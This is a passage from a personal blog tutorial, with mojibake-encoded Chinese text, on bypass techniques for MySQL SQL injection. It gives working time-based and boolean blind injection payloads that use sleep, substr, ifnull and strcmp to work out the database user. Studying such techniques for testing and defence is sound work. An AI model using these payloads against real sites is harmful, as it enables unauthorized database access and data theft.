<h5 id="ğŸš¨-BYPASS-1"><a href="#ğŸš¨-BYPASS-1" class="headerlink" title="ğŸš¨ BYPASS"></a>ğŸš¨ <em>BYPASS</em></h5><p>å¿…é¡»è¦ä½¿ç”¨åˆ° or çš„å»¶æ—¶æ³¨å…¥ä¸å¦‚è¯•è¯•å­æŸ¥è¯¢ï¼Œåªå»¶æ—¶ 5sã€‚</p>
<p><code>?id=1&#39; or if((substr((select user()),1,4)=&#39;root&#39;),(select sleep(5) from information_schema.schemata as b),1); -- +</code></p>
<h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>ç›²æ³¨çš„æ€è·¯å¾ˆå¤šï¼Œæ¯”å¦‚æ­£åˆ™åŒ¹é…ã€æ¯”è¾ƒå‡½æ•°ã€è¿ç®—ç¬¦ç­‰ç­‰ã€‚</p>
<p><code>?id=1&#39; and payload -- +</code></p>
<p>å¸ƒå°”ç›²æ³¨çš„åŸç†æ˜¯å¦‚æœ and ä¸¤è¾¹éƒ½ä¸ºçœŸï¼Œåˆ™æ­£å¸¸è¿”å›æ•°æ®ï¼Œå¦‚æœå…¶ä¸­ä¸€è¾¹ä¸ºå‡ï¼Œåˆ™æŸ¥è¯¢ä¸åˆ°æ•°æ®ã€‚</p>
<p><code>select * from users where id=1 and 0;</code></p>
<p><code>select * from users where id=1 and 1;</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.26.55.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ11.26.55"></p>
<p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
<h5 id="å­—ç¬¦ä¸²æˆªå–å¯¹æ¯”"><a href="#å­—ç¬¦ä¸²æˆªå–å¯¹æ¯”" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–å¯¹æ¯”"></a>å­—ç¬¦ä¸²æˆªå–å¯¹æ¯”</h5><p>ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰å¾ˆå¤šã€‚</p>
<p><code>?id=1&#39; and substr((select user()),1,4)=&#39;root&#39; -- +</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.16.33.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ10.16.33"></p>
<center>è¿”å›æ­£å¸¸ï¼Œç”¨æˆ·åä¸º root</center>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.17.13.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ10.17.13"></p>
<center>æ²¡æœ‰å›æ˜¾ï¼Œç”¨æˆ·åä¸æ˜¯ user</center>

<h5 id="ifnull-å‡½æ•°"><a href="#ifnull-å‡½æ•°" class="headerlink" title="ifnull() å‡½æ•°"></a><em>ifnull()</em> å‡½æ•°</h5><p><code>ifnull()</code> å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œè¯¥å‡½æ•°åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦ä¸º NULLï¼ˆ0ï¼‰ï¼Œå¦‚æœä¸º NULLï¼ˆ0ï¼‰ï¼Œåˆ™è¿”å›ç¬¬äºŒä¸ªå‚æ•°çš„å€¼ï¼Œå¦åˆ™è¿”å›ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚</p>
<p>âš ï¸ æ³¨æ„</p>
<p>ä½†æ˜¯è¿™é‡Œå®æµ‹å‘ç°ï¼Œ<code>ifnull()</code> å‡½æ•°åˆ¤æ–­ç¬¬ä¸€ä¸ªå€¼ï¼Œå¦‚æœä¸ºçœŸåˆ™è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ï¼Œä¸ä¼šè¿”å›ç¬¬äºŒä¸ªå€¼ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.23.33.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ11.23.33"></p>
<p><code>?id=1&#39; and ifnull((substr((select user()),1,4)=&#39;root&#39;),0) -- +</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.40.21.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ10.40.21"></p>
<h5 id="æ¯”è¾ƒå‡½æ•°-strcmp"><a href="#æ¯”è¾ƒå‡½æ•°-strcmp" class="headerlink" title="æ¯”è¾ƒå‡½æ•° strcmp()"></a>æ¯”è¾ƒå‡½æ•° <em>strcmp()</em></h5><p><code>strcmp()</code> å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒSTRCMP(expr1,expr2)ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸åŒï¼Œåˆ™è¿”å› 0ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ ¹æ®å½“å‰æ’åºé¡ºåºå°äºç¬¬äºŒä¸ªå‚æ•°ï¼Œåˆ™è¿”å› -1ï¼Œå¦åˆ™è¿”å› 1ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// å®ä¾‹</span><br><span class="line">SELECT strcmp(123, 123);        # 0</span><br><span class="line">SELECT strcmp(123, 122);        # 1</span><br><span class="line">SELECT strcmp(123, 124);        # -1</span><br><span class="line"></span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abc&apos;);    # 0</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abb&apos;);    # 1</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abd&apos;);    # -1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// å¦‚æœç”¨æˆ·åæ˜¯rootï¼Œåˆ™è¿”å›1ï¼Œ1å¤§äº0è¿”å›1ï¼Œandä¸¤è¾¹ä¸º1ï¼Œæ­£å¸¸è¿”å›æ•°æ®</span><br><span class="line">?id=1 and strcmp((substr((select user()),1,4)=&apos;root&apos;),0) -- +</span><br><span class="line"></span><br><span class="line">// å¦‚æœç”¨æˆ·åä¸æ˜¯toorï¼Œåˆ™è¿”å›0ï¼Œ0ç­‰äº0è¿”å›0ï¼ŒæŸ¥è¯¢ä¸åˆ°æ•°æ®</span><br><span class="line">?id=1 and strcmp((substr((select users()),1,4)=&apos;toor&apos;),0) -- +</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.21.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ11.31.21"></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.34.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ11.31.34"></p>
<p><em>Hard work and no play makes Nick a dull boy.</em></p>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ckaigj8so000quq90kgow0kvf" data-title="ğŸ’‰ SQLi_BYPASS_for_mysql Vol.2" data-url="https://naykcin.top/2020/01/07/sqlibypass2/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/08/sqlibypass3/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/06/sqlibypass/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>